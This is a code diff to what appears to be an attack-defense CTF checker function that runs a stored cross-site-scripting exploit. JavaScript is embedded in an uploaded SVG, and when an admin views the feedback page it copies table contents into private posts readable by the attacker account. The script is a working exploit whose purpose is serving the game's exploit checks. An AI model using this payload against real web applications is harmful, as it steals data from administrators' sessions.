@@ -377,36 +377,46 @@ async def exploit_feedback(task: ExploitCheckerTaskMessage,
     await conn.register_user(username, password)
     await conn.login_user(username, password)
     
-    # Create an SVG with malicious JavaScript that steals flags from the feedback page
-    malicious_js = """
-    (async () => {
-        try {
-            const thirdCell = document.querySelector('tbody tr td:nth-child(3)');
-            const flag = thirdCell
-            ? thirdCell.textContent.trim()
-            : 'FLAG_NOT_FOUND';
+    malicious_js = f"""
+        (async () => {{
+        try {{
+            const rows = document.querySelectorAll('tbody tr');
+            if (rows.length === 0) {{
+            return;
+            }}
 
-            const params = new URLSearchParams({
-            title:           flag,
-            description:     `Captured via admin feedback: ${flag}`,
-            difficulty:      'Easy',
-            testCases:       JSON.stringify(['dummy input']),
-            expectedOutputs: JSON.stringify(['dummy output']),
-            maxRuntime:      '1.0',
-            isPublished:     'false',
-            isPrivate:       'true',
-            accessUsers:     'user333'
-            });
+            for (const row of rows) {{
+            const cell = row.querySelector('td:nth-child(3)');
+            const feedbackText = cell ? cell.textContent.trim() : '';
+            
+            if (!feedbackText || feedbackText === 'SCRIPTED_FLAG_CAPTURED') {{
+                continue;
+            }}
+            
+            const flag = feedbackText;
 
-            await fetch('/problems/create', {
+            const params = new URLSearchParams({{
+                title:           flag,
+                description:     `Captured feedback: ${{flag}}`,
+                difficulty:      'Easy',
+                testCases:       JSON.stringify(['dummy input']),
+                expectedOutputs: JSON.stringify(['dummy output']),
+                maxRuntime:      '1.0',
+                isPublished:     'false',
+                isPrivate:       'true',
+                accessUsers:     '{username}'
+            }});
+
+            const res = await fetch('/problems/create', {{
                 method:      'POST',
                 credentials: 'include',
-                headers:     { 'Content-Type': 'application/x-www-form-urlencoded' },
+                headers:     {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                 body:        params.toString()
-            });
-        } catch (e) {
-        }
-    })();
+            }});
+            }}
+        }} catch (e) {{
+        }}
+        }})();
     """
     
     svg_payload = f"""<?xml version="1.0" standalone="no"?>
@@ -428,10 +438,9 @@ async def exploit_feedback(task: ExploitCheckerTaskMessage,
     with open(svg_path, "w") as f:
         f.write(svg_payload)
     
-    # Submit feedback with the malicious SVG
     with open(svg_path, 'rb') as svg_file:
         files = {'image': ('exploit.svg', svg_file, 'image/svg+xml')}
-        data = {'description': 'Testing feedback feature'}
+        data = {'description': 'SCRIPTED_FLAG_CAPTURED'}
         
         response = await conn.client.post(
             "/feedback/submit",
@@ -445,7 +454,7 @@ async def exploit_feedback(task: ExploitCheckerTaskMessage,
     if response.status_code not in [200, 201, 302]:
         raise MumbleException(f"Failed to submit feedback: {response.status_code}")
     
-    await asyncio.sleep(65)  # Give some time for the exploit to work
+    await asyncio.sleep(85) 
     
     response = await conn.client.get('/private-problems')
     
@@ -454,13 +463,6 @@ async def exploit_feedback(task: ExploitCheckerTaskMessage,
     
     if flag := searcher.search_flag(response.text):
         return flag
-    
-    await asyncio.sleep(5)
-    response = await conn.client.get('/private-problems')
-    
-    if response.status_code == 200:
-        if flag := searcher.search_flag(response.text):
-            return flag
             
     return None
 
